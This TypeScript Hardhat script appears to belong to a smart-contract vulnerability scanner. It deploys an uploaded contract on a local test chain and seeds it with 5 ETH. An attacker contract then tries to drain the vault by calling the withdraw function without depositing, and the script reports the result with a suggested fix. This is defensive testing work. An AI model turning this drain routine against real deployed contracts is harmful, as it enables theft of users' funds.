import hre from "hardhat";
import { parseEther, formatEther } from "ethers";
import { buildResult } from "./buildResult";
import { seedVault } from "./seedVault";
import type { ContractAnalysis } from "./analysisTypes";

async function main() {
  const contractName = process.env.UPLOADED_CONTRACT_NAME;
  const fileName = process.env.UPLOADED_FILE_NAME;
  if (!contractName || !fileName) throw new Error("UPLOADED_CONTRACT_NAME and UPLOADED_FILE_NAME must be set");

  const startTime = Date.now();
  const signers   = await hre.ethers.getSigners();
  const [deployer, attacker] = signers;

  const fullyQualified = `contracts/uploaded/${fileName}.sol:${contractName}`;
  const VictimFactory = await hre.ethers.getContractFactory(fullyQualified);
  const victim = await VictimFactory.deploy();
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  const iface = (victim as any).interface;

  // Seed vault with pooled funds before attacking
  const seedFn = (() => {
    try { return process.env.ANALYSIS_JSON ? (JSON.parse(process.env.ANALYSIS_JSON) as ContractAnalysis).seedFn : null; }
    catch { return null; }
  })();
  await seedVault(victim, signers, seedFn);

  // --- AI-powered detection via ANALYSIS_JSON ---
  // Gemini identifies the actual deposit/withdraw function names regardless of naming.
  // Falls back to hardcoded "withdraw" + "deposit" if ANALYSIS_JSON is absent or invalid.
  let withdrawFnName = "withdraw";
  let depositFnName = "deposit";
  let hasPattern = false;
  let usedAiAnalysis = false;

  const rawAnalysisJson = process.env.ANALYSIS_JSON;
  if (rawAnalysisJson) {
    try {
      const fullAnalysis = JSON.parse(rawAnalysisJson);
      const iv = fullAnalysis.inputvalidation;
      // support both old field names (withdrawFunction) and new (withdrawFn)
      const wFnObj = iv?.withdrawFn ?? iv?.withdrawFunction;
      const dFnObj = iv?.depositFn  ?? iv?.depositFunction;
      if (iv && typeof iv.found === "boolean" && iv.found === true && wFnObj && dFnObj) {
        withdrawFnName = wFnObj.name;
        depositFnName  = dFnObj.name;
        usedAiAnalysis = true;
        console.log(`[inputvalidation] Using Gemini analysis: withdraw=${withdrawFnName}, deposit=${depositFnName}`);

        // Verify functions actually exist in ABI (guard against hallucination)
        const wFn = iface.getFunction(withdrawFnName);
        const dFn = iface.getFunction(depositFnName);
        hasPattern =
          wFn !== null &&
          dFn !== null &&
          wFn.inputs.length === 1 &&
          wFn.inputs[0].type === "uint256";

        if (!hasPattern) {
          console.warn(`[inputvalidation] Gemini suggested ${withdrawFnName}/${depositFnName} but ABI check failed — trying fallback`);
          usedAiAnalysis = false;
        }
      } else if (iv && typeof iv.found === "boolean" && iv.found === false) {
        console.log(`[inputvalidation] Gemini: no input validation vulnerability detected`);
        // keep hasPattern = false, skip to "not applicable" result
      } else {
        throw new Error("Invalid or missing inputvalidation field");
      }
    } catch (e: any) {
      console.warn(`[inputvalidation] Could not parse ANALYSIS_JSON (${e.message}) — falling back to ABI detection`);
    }
  }

  // Legacy fallback: check for literal "withdraw" + "deposit"
  if (!usedAiAnalysis && !hasPattern) {
    const wFn = iface.getFunction("withdraw");
    const dFn = iface.getFunction("deposit");
    hasPattern =
      wFn !== null &&
      dFn !== null &&
      wFn.inputs.length === 1 &&
      wFn.inputs[0].type === "uint256";

    if (hasPattern) {
      withdrawFnName = "withdraw";
      depositFnName = "deposit";
      console.log(`[inputvalidation] Fallback ABI detection: using withdraw/deposit`);
    }
  }

  if (!hasPattern) {
    const endTime = Date.now();
    const balance: bigint = await hre.ethers.provider.getBalance(victimAddress);
    const result = buildResult({
      contractName,
      contractAddress: victimAddress,
      attackType: "inputvalidation",
      targetFunction: "N/A",
      severity: "High",
      initialBalance: balance,
      finalBalance: balance,
      stolenAmount: 0n,
      startTime,
      endTime,
      transactions: [],
      timeline: [
        `${contractName} deployed`,
        usedAiAnalysis
          ? "Gemini: no input validation vulnerability detected"
          : `No ${withdrawFnName}(uint256) + ${depositFnName}() pattern found`,
      ],
      report: {
        vulnerabilityType: "Input Validation",
        affectedFunction: "N/A",
        explanation: "Contract does not have the withdraw(uint256) + deposit() pattern required for this attack.",
        fix: "N/A",
      },
    });
    process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
    return;
  }

  // Seed vault using the detected deposit function
  await (victim as any).connect(deployer)[depositFnName]({ value: parseEther("5") });
  const initialBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);

  const AttackerFactory = await hre.ethers.getContractFactory("InputValidationAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy();
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  const callData = iface.encodeFunctionData(withdrawFnName, [initialBalance]);

  const t1 = Date.now();
  let attackSucceeded = false;

  try {
    await (attackerContract as any).connect(attacker).attack(victimAddress, callData);
    attackSucceeded = true;
  } catch {
    // Attack reverted — contract correctly checks caller's deposit balance
  }

  const endTime = Date.now();
  const finalBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  const stolenAmount: bigint = initialBalance > finalBalance ? initialBalance - finalBalance : 0n;
  const attackerBal: bigint = await hre.ethers.provider.getBalance(attackerAddress);

  const withdrawSig = `${withdrawFnName}(uint256)`;

  const result = buildResult({
    contractName,
    contractAddress: victimAddress,
    attackType: "inputvalidation",
    targetFunction: withdrawSig,
    severity: "High",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: attackSucceeded
      ? [
          {
            step: 1,
            description: `Legitimate user deposits 5 ETH into vault via ${depositFnName}()`,
            from: deployer.address,
            to: victimAddress,
            value: "5.0",
            unit: "ETH",
            timestampMs: t1 - 100,
            balanceAfter: { victim: formatEther(initialBalance), attacker: "0.0" },
          },
          {
            step: 2,
            description: `Attacker calls ${withdrawSig} (${formatEther(initialBalance)} ETH) — deposited 0`,
            from: attacker.address,
            to: victimAddress,
            value: formatEther(stolenAmount),
            unit: "ETH",
            timestampMs: endTime,
            balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
          },
        ]
      : [],
    timeline: attackSucceeded
      ? [
          `${contractName} deployed`,
          "Vault seeded with 5 ETH",
          "Attacker deposited: 0 ETH",
          `Attacker called ${withdrawSig}(${formatEther(initialBalance)})`,
          "No deposit check — VULNERABLE",
          "Vault drained",
        ]
      : [
          `${contractName} deployed`,
          "Vault seeded with 5 ETH",
          `Attacker tried ${withdrawSig}(${formatEther(initialBalance)}) without depositing`,
          "Contract correctly blocked the call — SAFE against input validation attack",
        ],
    report: {
      vulnerabilityType: "Input Validation",
      affectedFunction: withdrawSig,
      explanation: attackSucceeded
        ? `${withdrawSig} does not verify that the caller deposited the requested amount. Any address can withdraw the full vault balance without depositing.`
        : `Contract correctly validates that the caller's deposited balance covers the requested amount. Not vulnerable to this attack.`,
      fix: attackSucceeded
        ? `Add require(deposits[msg.sender] >= amount, 'Exceeds your deposit') before transferring ETH.`
        : "No fix needed — input validation is correctly implemented.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
